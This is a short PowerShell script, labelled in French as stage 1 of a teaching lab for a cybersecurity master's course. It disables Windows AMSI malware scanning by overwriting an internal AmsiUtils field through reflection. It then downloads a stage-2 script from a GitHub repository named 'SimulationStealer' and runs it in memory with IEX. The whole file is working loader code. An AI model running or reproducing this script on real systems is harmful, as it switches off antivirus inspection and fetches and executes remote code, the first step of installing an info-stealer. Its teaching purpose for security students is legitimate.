# ============================================
# Stage 1 - AMSI Bypass + appel Stage 2
# Lab pedagogique Master Cybersecurite
# ============================================

# AMSI Bypass
$a = [Ref].Assembly.GetTypes()
ForEach($b in $a) {
    if ($b.Name -like "*iUtils*") {
        $c = $b.GetFields('NonPublic,Static')
        ForEach($d in $c) {
            if ($d.Name -like "*Context*") {
                $d.SetValue($null, [IntPtr]0x246F756E74)
            }
        }
    }
}

# Appel Stage 2
$url = "https://raw.githubusercontent.com/asmaerouel/SimulationStealer/main/stage2.ps1"
IEX (New-Object Net.WebClient).DownloadString($url)